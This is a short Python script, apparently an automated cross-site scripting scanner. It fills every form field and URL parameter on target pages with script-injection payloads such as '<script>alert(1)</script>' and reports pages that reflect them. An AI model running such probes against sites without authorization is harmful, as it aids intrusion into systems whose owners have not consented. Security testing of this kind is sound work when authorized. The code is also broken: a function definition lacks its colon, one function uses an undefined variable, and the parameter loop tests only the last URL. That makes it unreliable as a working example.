from bs4 import BeautifulSoup
from pprint import pprint
import requests
s = requests.Session()
def XSS(param,linksalls,s)
	def parametercrawl(url,i):
			c=0
			newurl=url+i
			response = s.get(newurl)
			if i in response.text:
				c=1
				print(newurl+" is vulnerable to xss")
			return c	
	def initial(parameter):
		x = parameter.split("=")
		m=len(x)
		if m==2:
			craftedurl=x[0]+"="
		return 	craftedurl
	def getallforms(url):
		res=s.get(url)
		soup=BeautifulSoup(res.content,"html.parser")
		m=soup.find_all('form')
		return m
	def submitform(form,pay):
		payloads=pay
		str(payloads)
		if form['method'].lower()=="get":
			data={}
			for input_tag in form.find_all("input"):	
				if input_tag["type"]=="submit":
					data.update({input_tag["name"]:input_tag["name"]})
				else:
					data.update({input_tag["name"]:payloads})
			for textareas in form.find_all("textarea"):	
				data.update({textareas["name"]:payloads})
			res = s.get(url, params=data)
			if payloads in res.text:
				print(url+" is vulnerable to xss")
		if form['method'].lower()=="post":
			data={}
			for input_tag in form.find_all("input"):
				if input_tag["type"]=="submit":
					data.update({input_tag["name"]:input_tag["name"]})
				else:
					data.update({input_tag["name"]:payloads})
			for textareas in form.find_all("textarea"):	
				data.update({textareas["name"]:payloads})
			res = s.post(url, data=data)
			if payloads in res.text:
				print(url+" is vulnerable to xss")
	payloads=["<script>alert(1)</script>","<body onafterprint=alert(1)>"]

	listt=[]
	for i in linksalls:
		u=getallforms(i)		
		for j in u:
			if j in listt:
				break
			else:
				listt.append(j)
			for i in payloads:
				submitform(j,i)
	for i in param:
		craftedur=initial(i)
	for j in param:
		initial(j)
		for i in payloads:
			c=parametercrawl(craftedur,i)
			if c==1:
				break
